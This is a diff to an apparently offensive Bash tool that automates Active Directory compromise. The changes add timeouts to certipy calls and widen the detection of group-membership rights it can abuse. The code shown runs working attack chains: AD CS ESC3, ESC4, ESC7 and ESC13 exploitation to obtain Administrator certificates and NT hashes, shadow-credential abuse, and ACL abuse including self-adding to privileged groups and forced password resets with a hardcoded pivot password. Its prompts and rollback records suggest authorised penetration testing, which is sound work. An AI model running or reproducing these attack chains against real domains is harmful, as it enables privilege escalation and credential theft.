@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.11.0"
+readonly VERSION="1.11.1"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -147,6 +147,9 @@ GRAPH_ZIP=""        # --graph: render a BloodHound zip to graph.html and exit
 OWNED_FILE=""       # --owned: file of compromised principals to flag in the graph
 NO_OPEN=0           # 1 = never auto-open the graph in a browser
 PIVOT_PW='ADAutoPwn!2024#Reset'   # password set when abusing ForceChangePassword
+CERTIPY_TO=180      # hard timeout (s) on every certipy call — it loves to hang on
+                    # an unreachable CA / bad DNS / Kerberos bind, and a hung scan
+                    # is worse than a missed ESC. The relay attempt has its own cap.
 
 declare -a FOUND_USERS=()
 declare -a CRED_QUEUE=()          # pending creds to assess: "user|pass|hash"
@@ -838,18 +841,18 @@ phase_adcs() {
     elif [[ -n "$HASH" ]]; then cauth=(-hashes ":$HASH")
     elif [[ -n "$KERB_TICKET" ]]; then cauth=(-k -no-pass -dc-host "${DC_FQDN:-$DCT}"); cenv=(env "KRB5CCNAME=$KERB_TICKET"); fi
     run "certipy find ${cbase[*]} ${cauth[*]} -stdout -vulnerable"
-    local cout; cout=$("${cenv[@]}" certipy find "${cbase[@]}" "${cauth[@]}" -stdout -vulnerable 2>&1)
+    local cout; cout=$("${cenv[@]}" timeout "${CERTIPY_TO:-180}" certipy find "${cbase[@]}" "${cauth[@]}" -stdout -vulnerable 2>&1)
     # Password/NTLM bind refused but we have a ticket → retry over Kerberos.
     if grep -qiE 'authentication failed|invalidCredentials|NTLM.*failed|STATUS_' <<<"$cout" \
        && [[ -n "$KERB_TICKET" && "${cauth[0]}" != "-k" ]]; then
         warn "certipy password/NTLM bind failed → retrying over Kerberos"
         cauth=(-k -no-pass -dc-host "${DC_FQDN:-$DCT}"); cenv=(env "KRB5CCNAME=$KERB_TICKET")
-        cout=$("${cenv[@]}" certipy find "${cbase[@]}" "${cauth[@]}" -stdout -vulnerable 2>&1)
+        cout=$("${cenv[@]}" timeout "${CERTIPY_TO:-180}" certipy find "${cbase[@]}" "${cauth[@]}" -stdout -vulnerable 2>&1)
     fi
     echo "$cout" | tee -a "$LOGFILE"; echo "$cout" >"$OUTDIR/certipy_find.txt"
 
     # full structured output (BloodHound + JSON) for later analysis
-    "${cenv[@]}" certipy find "${cbase[@]}" "${cauth[@]}" -output "$OUTDIR/certipy" >/dev/null 2>&1
+    "${cenv[@]}" timeout "${CERTIPY_TO:-180}" certipy find "${cbase[@]}" "${cauth[@]}" -output "$OUTDIR/certipy" >/dev/null 2>&1
 
     if echo "$cout" | grep -qiE 'ESC[0-9]+'; then
         local escs; escs=$(echo "$cout" | grep -oiE 'ESC[0-9]+' | sort -u | tr '\n' ' ')
@@ -1295,9 +1298,19 @@ phase_acl() {
             # Resolve the sAMAccountName — abuse tools need it, NOT the CN/display
             # name. A "CN=Jane Doe" must become "jane.doe" or every reset/
             # shadow/RBCD against it fails (a display-name CN stalls the chain).
-            cur_sam=$(bloodyAD "${ba[@]}" get object "$cur_dn" --attr sAMAccountName 2>/dev/null \
-                        | grep -oiP 'sAMAccountName:\s*\K\S+' | head -1)
+            # One lookup gets BOTH the sAMAccountName AND the objectClass, so we
+            # reliably know if the target is a group/computer/OU regardless of
+            # whether bloodyAD's writable output spelled it out (this is what makes
+            # AddSelf→group detection work — the group DN rarely contains 'group').
+            local _obj; _obj=$(bloodyAD "${ba[@]}" get object "$cur_dn" --attr sAMAccountName,objectClass 2>/dev/null)
+            cur_sam=$(grep -oiP 'sAMAccountName:\s*\K\S+' <<<"$_obj" | head -1)
             [[ -z "$cur_sam" ]] && cur_sam="$cur_name"
+            if [[ -z "$cur_class" ]]; then
+                if   grep -qiE 'objectClass:.*\bcomputer\b'           <<<"$_obj"; then cur_class="computer"
+                elif grep -qiE 'objectClass:.*\bgroup\b'              <<<"$_obj"; then cur_class="group"
+                elif grep -qiE 'objectClass:.*\borganizationalUnit\b' <<<"$_obj"; then cur_class="ou"
+                elif grep -qiE 'objectClass:.*\buser\b'               <<<"$_obj"; then cur_class="user"; fi
+            fi
             # Domain head (DC=…,DC=… with no CN) → writeDacl here means DCSync
             if [[ -z "$cur_name" && "$cur_dn" =~ ^[Dd][Cc]= ]]; then
                 cur_name="${DOMAIN:-domain}"; cur_sam="$cur_name"; cur_class="domain"
@@ -1315,7 +1328,12 @@ phase_acl() {
         if   [[ "$ll" == *keycredentiallink* ]]; then act="shadow"
         elif [[ "$ll" == *allowedtoactonbehalfofotheridentity* ]]; then act="rbcd"
         elif [[ "$ll" == *serviceprincipalname* ]]; then act="spn"
-        elif [[ "$ll" == *member:* && ( "$cur_class" == "group" || "$cur_dn" =~ [Gg]roup ) ]]; then act="group"
+        # Any right that lets us write a GROUP's membership → add ourselves. This
+        # must catch AddSelf (Self-Membership) and AddMember too, which bloodyAD
+        # surfaces as 'member'/'self', NOT as GenericAll — so keying only on
+        # GenericAll (the old behaviour) silently missed AddSelf→privileged-group.
+        elif [[ ( "$cur_class" == "group" || "$cur_dn" =~ [Gg]roup ) \
+                && "$ll" =~ (member|self|addself|writemembers|genericall|fullcontrol|writedacl|owner|allextendedrights) ]]; then act="group"
         elif [[ "$ll" =~ (genericall|owner|fullcontrol|writedacl|allextendedrights) ]]; then act="full"
         else continue; fi
 
@@ -1436,11 +1454,11 @@ _abuse_shadowcred() {
     elif [[ -n "$HASH" ]]; then cauth=(-hashes ":$HASH")
     elif [[ -n "$KERB_TICKET" ]]; then cauth=(-k -no-pass -dc-host "${DC_FQDN:-$DCT}"); cenv=(env "KRB5CCNAME=$KERB_TICKET"); fi
     run "certipy shadow auto ${cbase[*]} ${cauth[*]}"
-    local out; out=$("${cenv[@]}" certipy shadow auto "${cbase[@]}" "${cauth[@]}" 2>&1)
+    local out; out=$("${cenv[@]}" timeout "${CERTIPY_TO:-180}" certipy shadow auto "${cbase[@]}" "${cauth[@]}" 2>&1)
     if grep -qiE 'authentication failed|invalidCredentials|NTLM.*failed|No credentials provided' <<<"$out" \
        && [[ -n "$KERB_TICKET" && "${cauth[0]}" != "-k" ]]; then
         cauth=(-k -no-pass -dc-host "${DC_FQDN:-$DCT}"); cenv=(env "KRB5CCNAME=$KERB_TICKET")
-        out=$("${cenv[@]}" certipy shadow auto "${cbase[@]}" "${cauth[@]}" 2>&1)
+        out=$("${cenv[@]}" timeout "${CERTIPY_TO:-180}" certipy shadow auto "${cbase[@]}" "${cauth[@]}" 2>&1)
     fi
     echo "$out" | tee -a "$LOGFILE"
     local nt; nt=$(echo "$out" | grep -oiP "Got hash for .*:\s*\K\S+" | awk -F: '{print $NF}' | head -1)
@@ -1571,7 +1589,7 @@ _adcs_pwn_pfx() {                       # _adcs_pwn_pfx <pfx-basename> <label> [
     [[ -z "$pfx" || ! -f "$OUTDIR/$pfx" ]] && { warn "  ${label}: no certificate produced"; return 1; }
     rb_record "${label}: issued/used a certificate for '${who}'" "echo 'Manual: revoke the issued certificate at the CA'"
     run "certipy auth -pfx $pfx -dc-ip $DC_IP"
-    local aout; aout=$( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy auth -pfx "$pfx" -dc-ip "$DC_IP" 2>&1 ); echo "$aout" | tee -a "$LOGFILE"
+    local aout; aout=$( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout "${CERTIPY_TO:-180}" certipy auth -pfx "$pfx" -dc-ip "$DC_IP" 2>&1 ); echo "$aout" | tee -a "$LOGFILE"
     local nt; nt=$(grep -oiP 'Got hash for .*:\s*\K[a-f0-9]{32}:[a-f0-9]{32}' <<<"$aout" | awk -F: '{print $NF}' | head -1)
     if [[ "$nt" =~ ^[a-fA-F0-9]{32}$ ]]; then
         loot "★★★ ${label} → ${who} NT hash: ${C_MAGENTA}$nt${C_RESET}"
@@ -1592,7 +1610,7 @@ _adcs_req_admin() {                     # _adcs_req_admin <ca> <tpl> <label> <wi
     local rargs=(req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$tpl" -upn "administrator@${DOMAIN}" \
                  "${sidargs[@]}" -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" "$@")
     run "certipy ${rargs[*]}"
-    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy "${rargs[@]}" 2>&1 ) | tee -a "$LOGFILE"
+    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout "${CERTIPY_TO:-180}" certipy "${rargs[@]}" 2>&1 ) | tee -a "$LOGFILE"
     _adcs_pwn_pfx "$(ls -t "$OUTDIR"/administrator*.pfx 2>/dev/null | head -1 | xargs -r basename)" "$label"
 }
 
@@ -1600,11 +1618,11 @@ _adcs_req_admin() {                     # _adcs_req_admin <ca> <tpl> <label> <wi
 _adcs_esc3() {
     local ca="$1" agenttpl="$2"; _adcs_setauth
     confirm "  ESC3: use Enrollment Agent template '$agenttpl' to enrol on behalf of Administrator?" || return 1
-    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$agenttpl" \
+    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout "${CERTIPY_TO:-180}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$agenttpl" \
         -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ) | tee -a "$LOGFILE"
     local agent; agent=$(ls -t "$OUTDIR"/*.pfx 2>/dev/null | grep -vi administrator | head -1)
     [[ -z "$agent" ]] && { warn "  ESC3: no enrollment-agent PFX produced"; return 1; }
-    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template User \
+    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout "${CERTIPY_TO:-180}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template User \
         -on-behalf-of "${DOMAIN%%.*}\\administrator" -pfx "$(basename "$agent")" \
         -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ) | tee -a "$LOGFILE"
     _adcs_pwn_pfx "$(ls -t "$OUTDIR"/administrator*.pfx 2>/dev/null | head -1 | xargs -r basename)" "ESC3"
@@ -1613,13 +1631,13 @@ _adcs_esc3() {
 _adcs_esc4() {
     local ca="$1" tpl="$2"; _adcs_setauth
     confirm "  ESC4: reconfigure template '$tpl' to be vulnerable, exploit, then restore?" || return 1
-    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy template "${_ADCS_AUTH[@]}" -template "$tpl" \
+    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout "${CERTIPY_TO:-180}" certipy template "${_ADCS_AUTH[@]}" -template "$tpl" \
         -write-default-configuration -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ) | tee -a "$LOGFILE"
     rb_record "ESC4: overwrote template $tpl config" \
               "certipy template -template '$tpl' -configuration '$OUTDIR/${tpl}.json' -dc-ip '$DC_IP'  # restore saved config"
     _adcs_req_admin "$ca" "$tpl" "ESC4" 1; local rc=$?
     # restore the original template configuration (best-effort)
-    [[ -f "$OUTDIR/${tpl}.json" ]] && ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy template "${_ADCS_AUTH[@]}" \
+    [[ -f "$OUTDIR/${tpl}.json" ]] && ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout "${CERTIPY_TO:-180}" certipy template "${_ADCS_AUTH[@]}" \
         -template "$tpl" -configuration "${tpl}.json" -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
     return $rc
 }
@@ -1627,22 +1645,22 @@ _adcs_esc4() {
 _adcs_esc7() {
     local ca="$1"; _adcs_setauth
     confirm "  ESC7: add self as CA officer, enable SubCA, issue a request as Administrator?" || return 1
-    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy ca "${_ADCS_AUTH[@]}" -ca "$ca" -add-officer "$USER" -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
+    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout "${CERTIPY_TO:-180}" certipy ca "${_ADCS_AUTH[@]}" -ca "$ca" -add-officer "$USER" -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
     rb_record "ESC7: added $USER as officer on CA $ca" "certipy ca -ca '$ca' -remove-officer '$USER' -dc-ip '$DC_IP'"
-    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy ca "${_ADCS_AUTH[@]}" -ca "$ca" -enable-template SubCA -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
-    local out; out=$( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template SubCA \
+    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout "${CERTIPY_TO:-180}" certipy ca "${_ADCS_AUTH[@]}" -ca "$ca" -enable-template SubCA -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
+    local out; out=$( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout "${CERTIPY_TO:-180}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template SubCA \
         -upn "administrator@${DOMAIN}" -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ); echo "$out" | tee -a "$LOGFILE"
     local rid; rid=$(grep -oiP 'request ID is\s*\K[0-9]+' <<<"$out" | head -1)
     [[ -z "$rid" ]] && { _adcs_pwn_pfx "$(ls -t "$OUTDIR"/administrator*.pfx 2>/dev/null|head -1|xargs -r basename)" "ESC7"; return $?; }
-    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy ca "${_ADCS_AUTH[@]}" -ca "$ca" -issue-request "$rid" -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
-    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -retrieve "$rid" -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ) | tee -a "$LOGFILE"
+    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout "${CERTIPY_TO:-180}" certipy ca "${_ADCS_AUTH[@]}" -ca "$ca" -issue-request "$rid" -dc-ip "$DC_IP" 2>&1 ) | tee -a "$LOGFILE"
+    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout "${CERTIPY_TO:-180}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -retrieve "$rid" -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ) | tee -a "$LOGFILE"
     _adcs_pwn_pfx "$(ls -t "$OUTDIR"/administrator*.pfx 2>/dev/null|head -1|xargs -r basename)" "ESC7"
 }
 # ESC13 — issuance policy linked to a group: enrol, auth → TGT carries that group.
 _adcs_esc13() {
     local ca="$1" tpl="$2"; _adcs_setauth
     confirm "  ESC13: enrol template '$tpl' to inherit its linked (privileged) group?" || return 1
-    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$tpl" \
+    ( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout "${CERTIPY_TO:-180}" certipy req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$tpl" \
         -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" 2>&1 ) | tee -a "$LOGFILE"
     local pfx; pfx=$(ls -t "$OUTDIR"/*.pfx 2>/dev/null | head -1 | xargs -r basename)
     _adcs_pwn_pfx "$pfx" "ESC13" "$USER"   # self hash/TGT, now with the linked group in its PAC
